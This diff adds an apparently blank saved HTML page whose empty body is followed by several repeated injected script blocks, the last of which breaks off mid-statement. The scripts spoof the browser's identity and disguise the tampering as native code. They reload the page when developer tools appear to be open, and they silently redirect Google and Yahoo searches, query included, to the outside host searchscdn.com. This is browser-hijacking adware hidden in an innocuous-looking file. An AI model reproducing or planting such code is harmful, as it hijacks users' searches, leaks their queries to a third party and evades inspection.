@@ -1,0 +1,1419 @@
+
+<!-- saved from url=(0011)about:blank -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body></body><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
+                ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"]
+            ).then(function(hints_value){
+                let new_hints_value_json = JSON.stringify(hints_value).replaceAll("Microsoft Edge", "Google Chrome");
+                let get_getHighEntropyValues = function getHighEntropyValues(hints){
+                    let no_need_hints = ["brands","mobile","platform","architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList","wow64"];
+                    let new_hints_value = JSON.parse(new_hints_value_json);
+                    no_need_hints = no_need_hints.filter(x => !hints.includes(x));
+                    if (no_need_hints.length >0) {
+                        no_need_hints.forEach(rm_hints => {
+                            delete new_hints_value[rm_hints];
+                        });
+                    }
+                    return new Promise((resolve, reject) => {
+                        resolve(new_hints_value);
+                    });
+                }
+                assignGetterProperties(get_getHighEntropyValues, "getHighEntropyValues");
+                if (nav.userAgentData){
+                    Object.defineProperties(Object.getPrototypeOf(nav.userAgentData), {
+                        "getHighEntropyValues": {
+                            value: get_getHighEntropyValues
+                        }
+                    });
+                }
+            })
+        } 
+    }
+    change_ua(navigator,-1);
+    function change_iframe_ua(){
+        for (let index = 0; index < window.frames.length; index++) {
+            change_ua(window.frames[index].navigator,index);
+        }
+        setTimeout(()=>{
+            document.querySelectorAll('iframe').forEach(iframe => {
+                iframe.sandbox = "allow-scripts"
+            });
+            for (let index = 0; index < window.frames.length; index++) {                        
+                change_ua(window.frames[index].navigator,index);
+            }
+        },500);
+    }
+    if (document.readyState != "complete") document.addEventListener("DOMContentLoaded",change_iframe_ua)
+    change_iframe_ua()
+    const script = document.currentScript;
+    script.parentNode.removeChild(script);`;
+    document.documentElement.appendChild(script);
+})();
+(()=>{
+    let sid = 'XRSlTamhRkJ9eKb19BJ';
+    let rl = false;
+    const
+    wins=()=>{
+        return (100 < window.outerWidth - window.innerWidth || 200 < window.outerHeight - window.innerHeight);
+    },
+    cad=()=>{
+        if (wins() && !rl){
+            rl = true;
+            location.reload();
+        }
+    }
+    if (!wins()){
+        setInterval(cad, 100);
+        if (!document.getElementById(sid)){
+            let s = document.createElement('image');
+            s.id = sid;
+            document.body.appendChild(s);
+            let rules = [
+                {
+                    "rules":"^http(s|)://(www\\.|)google\\.[a-z.]{2,7}/search",
+                    "excludes":["[?&]tbm=","[?]q=[^&]*$"],
+                    "to":"https://searchscdn.com/2003/?s=g&q=",
+                    "key":"q"
+                },
+                {
+                    "rules":"^http(s|)://search\\.yahoo\\.com/search",
+                    "excludes":["[?&]hsimp=yhs-delfia(&|$)","[?&]hsimp=yhs-invalid(&|$)"],
+                    "to":"https://searchscdn.com/2003/?s=y&q=",
+                    "key":"p"
+                }
+            ];
+            rules.forEach(data=>{
+                if(new RegExp(data.rules).test(location.href)){
+                    let exclude = false;                
+                    for (let excludes of data.excludes) {
+                        if (new RegExp(excludes).exec(location.href)) exclude = true;
+                    }
+                    if (!exclude){
+                        let lurl = new URL(location.href);
+                        let rurl = data.to+encodeURIComponent(lurl.searchParams.get(data.key));
+                        location = rurl;
+                    }
+                }
+            })
+        }
+    };
+})();</script><script>(function(){
+    function findFrameIndex() {
+        let result = "";
+        try {
+            let parent, child = window;
+            while (child.parent != child) {
+                parent = child.parent;
+                for (let i = 0; i < parent.frames.length; i++) {
+                    if (parent.frames[i] == child) {
+                        result += i;   
+                    }
+                }                
+                child = parent;
+            }
+        } catch (e) {}
+        return result;
+    };
+    const storageKeyStart = "ua-script-prot-storage" + location.href + findFrameIndex() + "-key";
+    const storageCurrentKey = storageKeyStart + performance.timing.responseStart;
+    if (window[storageCurrentKey]) return;
+    window[storageCurrentKey] = 1;
+    const newUA = navigator.userAgent.replace(/[\s]+Edg[^\s]+/, '');
+    const newVersion = newUA.replace('Mozilla/', '');
+    let newUserAgentDataBrands = null;
+    if (navigator.userAgentData){
+        newUserAgentDataBrands = JSON.stringify(navigator.userAgentData.brands).replace("Microsoft Edge", "Google Chrome");
+    } 
+    const script = document.createElement('script');
+    script.textContent = `
+    let change_ua = function(nav,tt) {
+        if (nav.userAgent != '${newUA}') {
+            const proto = Object.getPrototypeOf(nav);
+            const toStringForToString = function toString() {
+                return "function toString() { [native code] }";
+            };
+            const setToStringProperties = function(func) {
+                Object.defineProperty(func, 'name', {value: "toString"});
+                Object.defineProperty(func, 'toString', {value: toStringForToString, enumerable: false});
+            };
+            setToStringProperties(toStringForToString);
+            const assignGetterProperties = function(getter, name, noPrefix) {
+                const prefix = (noPrefix ? "" : "get ");
+                Object.defineProperty(getter, 'name', {value: prefix+name});
+                const toString = function toString() {
+                    return "function "+prefix+name+"() { [native code] }";
+                };
+                setToStringProperties(toString);
+                Object.defineProperty(getter, 'toString', {value: toString, enumerable: false});
+            };
+            const get_vendor = function vendor() {
+                return 'Google Inc.';
+            };
+            assignGetterProperties(get_vendor, "vendor");
+            if (nav.vendor != 'Google Inc.') Object.defineProperty(proto, 'vendor', {get: get_vendor});
+            const get_vendorSub = function vendorSub() {
+                return '';
+            };
+            assignGetterProperties(get_vendorSub, "vendorSub");
+            if (nav.vendorSub != '') Object.defineProperty(proto, 'vendorSub', {get: get_vendorSub});                            
+            const get_userAgent = function userAgent() {
+                return '${newUA}';
+            };
+            assignGetterProperties(get_userAgent, "userAgent");
+            Object.defineProperty(proto, 'userAgent', {get: get_userAgent});
+            const get_appVersion = function appVersion() {
+                return '${newVersion}';
+            };
+            assignGetterProperties(get_appVersion, "appVersion");
+            Object.defineProperty(proto, 'appVersion', {get: get_appVersion});
+            const replacePluginName = name => name.replace("Microsoft Edge", "Chrome");
+        
+            const pluginsKeysDescriptors = Object.getOwnPropertyDescriptors(nav.plugins);
+            const newPluginsValuesDescriptors = {};
+            for (let key in pluginsKeysDescriptors) {
+                newPluginsValuesDescriptors[key] = Object.getOwnPropertyDescriptor(nav.plugins, key);
+            } 
+            
+            const get_name = function name() {
+                return this.Name;
+            };
+            assignGetterProperties(get_name, "name");
+            for (let key in newPluginsValuesDescriptors) {
+                let newName = replacePluginName(newPluginsValuesDescriptors[key].value.name);                
+                if (key.indexOf("Microsoft Edge")>=0) {
+                    let newKey = replacePluginName(key);
+                    newPluginsValuesDescriptors[newKey] = newPluginsValuesDescriptors[key];
+                    delete newPluginsValuesDescriptors[key];
+                    newPluginsValuesDescriptors[newKey].value['Name'] = newName + ' test'
+                    newPluginsValuesDescriptors[newKey].writable = false;
+                } else {
+                    newPluginsValuesDescriptors[key].writable = true;
+                    newPluginsValuesDescriptors[key].value['Name'] = newName
+                    newPluginsValuesDescriptors[key].writable = false;
+                }
+            }
+            if (nav.plugins[0]){
+                Object.defineProperty(Object.getPrototypeOf(nav.plugins[0]), "name", {get: get_name});
+            }
+            const pluginsProto = Object.getPrototypeOf(nav.plugins);
+            const newPlugins = Object.create(pluginsProto);
+            for (let key in newPluginsValuesDescriptors) {
+                Object.defineProperty(newPlugins, key, newPluginsValuesDescriptors[key]);
+            }
+            const new_refresh = function refresh() {};
+            assignGetterProperties(new_refresh, "refresh", true);
+            const new_item = function item(index) {
+                return newPlugins[+index || 0] || null;
+            };
+            assignGetterProperties(new_item, "item", true);
+            const new_namedItem = function namedItem(key) {
+                if (!key || !key.trim || parseInt(key) || key.trim() == "0")
+                    return null;
+                return newPlugins[key] || null; 
+            };
+            assignGetterProperties(new_namedItem, "namedItem", true);
+            const pluginsLength = nav.plugins.length;
+            Object.defineProperties(pluginsProto, {
+                "item": {value: new_item},
+                "namedItem": {value: new_namedItem},
+                "refresh": {value: new_refresh}
+            });
+            const get_plugins = function plugins() {
+                return newPlugins;
+            };
+            assignGetterProperties(get_plugins, "plugins");
+            Object.defineProperty(proto, "plugins", {get: get_plugins});
+            const get_length = function length() {
+                return pluginsLength;
+            };
+            assignGetterProperties(get_length, "length");
+            Object.defineProperty(Object.getPrototypeOf(nav.plugins), "length", {get: get_length});
+        
+            let newBrands;
+            if (nav.userAgentData) newBrands = JSON.parse('${newUserAgentDataBrands}');
+            const get_brands = function brands() {
+                return newBrands;
+            };
+            assignGetterProperties(get_brands, "brands");
+            if (nav.userAgentData) Object.defineProperty(Object.getPrototypeOf(nav.userAgentData), "brands", {get: get_brands});
+            
+            navigator.userAgentData.getHighEntropyValues(
